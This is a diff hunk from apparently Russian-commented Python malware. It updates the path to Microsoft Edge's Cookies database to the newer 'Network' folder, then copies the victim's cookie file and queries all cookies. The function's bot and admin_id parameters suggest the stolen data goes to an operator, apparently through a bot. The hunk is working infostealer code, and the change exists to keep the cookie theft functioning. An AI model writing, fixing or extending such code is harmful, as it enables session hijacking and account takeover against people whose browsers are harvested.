@@ -80,7 +80,7 @@ def Edge(dp, bot, admin_id):  # Простая функция
                 # Кароче я задолбался комментировать весь код, там все идет примерно как выше
 
                 CookiesSQL = "SELECT * FROM cookies"
-                data_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default"
+                data_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default\Network"
                 files = os.listdir(data_path)
                 history_db = os.path.join(data_path, 'Cookies')
                 shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
